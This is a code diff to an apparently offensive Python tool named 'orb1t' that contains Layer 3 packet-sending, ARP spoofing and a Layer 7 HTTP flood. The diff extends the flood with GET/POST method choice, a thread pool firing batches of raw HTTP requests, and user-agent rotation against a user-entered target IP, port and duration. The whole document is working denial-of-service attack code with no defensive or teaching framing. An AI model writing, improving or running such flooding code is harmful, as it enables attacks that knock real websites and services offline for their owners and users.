@@ -2,6 +2,7 @@
 
 import os; os.system('mode con: cols=120 lines=30')
 import socket
+from concurrent.futures import ThreadPoolExecutor
 import threading
 import struct
 import time
@@ -260,9 +261,6 @@ class orb1t:
 """)
         input(Fore.YELLOW + "Press Enter to return to the menu...")
         
-        
-
-
     def load_module(self, command):
         if command == 'l3':
             self.interactive_layer3()
@@ -296,20 +294,26 @@ class orb1t:
             threading.Thread(target=self.send_packets, args=(self.settings["target"],)).start()
 
     def interactive_layer7(self):
-        self.settings["target"] = input(Fore.YELLOW + "Enter target IP or domain: ")
-        self.settings["port"] = int(input(Fore.YELLOW + "Enter target port: "))
-        self.settings["threads"] = int(input(Fore.YELLOW + "Enter number of threads: "))
-        self.settings["duration"] = int(input(Fore.YELLOW + "Enter attack duration in seconds (default 60): ") or 60)
+     self.settings["target"] = input(Fore.YELLOW + "Enter target IP or domain: ")
+     self.settings["port"] = int(input(Fore.YELLOW + "Enter target port: "))
+     self.settings["threads"] = int(input(Fore.YELLOW + "Enter number of threads: "))
+     self.settings["duration"] = int(input(Fore.YELLOW + "Enter attack duration in seconds (default 60): ") or 60)
+    
+     self.settings["method"] = input(Fore.YELLOW + "Enter HTTP method (GET or POST, default is GET): ") or "GET"
+    
+     if self.settings["method"].upper() == "POST":
+        self.settings["payload"] = input(Fore.YELLOW + "Enter POST body (e.g., param1=value1&param2=value2): ")
+     else:
+        self.settings["payload"] = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(self.settings["target"])
 
-        print(Fore.GREEN + "\nConfiguration complete! Starting Layer 7 attack...")
-        self.start_time = time.time()
-        payload = self.settings["payload"].format(self.settings["target"])
-        for _ in range(self.settings["threads"]):
-            threading.Thread(target=self.send_http_requests, args=(self.settings["target"], payload)).start()
+     print(Fore.GREEN + "\nConfiguration complete! Starting Layer 7 attack...")
+     self.start_time = time.time()
+    
+     for _ in range(self.settings["threads"]):
+        threading.Thread(target=self.send_http_requests, args=(self.settings["target"], self.settings["method"], self.settings["payload"])).start()
 
     
     def checksum(self, source_string):
-        """Calculate the checksum of the packet (RFC 1071)."""
         sum = 0
         max_count = (len(source_string) // 2) * 2
         count = 0
@@ -453,30 +457,40 @@ class orb1t:
         except Exception as e:
             print(Fore.RED + f"Error during ARP spoofing: {e}")
 
-    def send_single_request(self, target_ip, payload, user_agent):
+
+
+    def load(self, method, target_ip, body=None):
+        if method.upper() == "POST":
+            payload = f"POST / HTTP/1.1\r\nHost: {target_ip}\r\n" \
+                      "Content-Type: application/x-www-form-urlencoded\r\n" \
+                      f"Content-Length: {len(body)}\r\n\r\n{body}"
+        else:  
+            payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
+        return payload
+
+    def send_single_request(self, target_ip, method, body, user_agent):
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                sock.settimeout(2)  # Set a timeout for the socket
+                sock.settimeout(2)  
                 sock.connect((target_ip, self.settings["port"]))
+
+                payload = self.load(method, target_ip, body)
 
                 headers = {
                     "User-Agent": user_agent,
-                    "Content-Type": "application/x-www-form-urlencoded",
                     "Connection": "keep-alive",
                 }
 
-                request = f"POST / HTTP/1.1\r\nHost: {target_ip}\r\n" + \
-                          ''.join(f"{key}: {value}\r\n" for key, value in headers.items()) + \
-                          f"Content-Length: {len(payload)}\r\n\r\n{payload}"
+                request = payload + ''.join(f"{key}: {value}\r\n" for key, value in headers.items()) + "\r\n"
 
                 sock.sendall(request.encode())
                 with self.lock:
                     self.packet_count += 1
-                self.log(Fore.MAGENTA + f"Sent HTTP request to {target_ip}:{self.settings['port']}")
-        except Exception as e:
+                self.log(Fore.MAGENTA + f"Sent {method} request to {target_ip}:{self.settings['port']}")
+        except (socket.error, ConnectionRefusedError) as e:
             self.log(Fore.RED + f"HTTP Error: {e}")
 
-    def send_http_requests(self, target_ip, payload):
+    def send_http_requests(self, target_ip, method="GET", body="", num_requests=100):
         user_agents_file = 'src/user-agents.txt'
         user_agents = []
 
@@ -486,17 +500,15 @@ class orb1t:
         else:
             self.log(Fore.RED + "User-Agent file not found. Default User-Agents will be used.")
 
+        default_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
+
         while self.running:
-            threads = []
-            for _ in range(100): 
-                user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
-                thread = threading.Thread(target=self.send_single_request, args=(target_ip, payload, user_agent))
-                threads.append(thread)
-                thread.start()
-            
-           
-            for thread in threads:
-                thread.join()
+            with ThreadPoolExecutor(max_workers=num_requests) as executor:
+                for _ in range(num_requests):
+                    user_agent = random.choice(user_agents) if user_agents else default_user_agent
+                    executor.submit(self.send_single_request, target_ip, method, body, user_agent)
+
+
 
 if __name__ == "__main__":
     tool = orb1t()
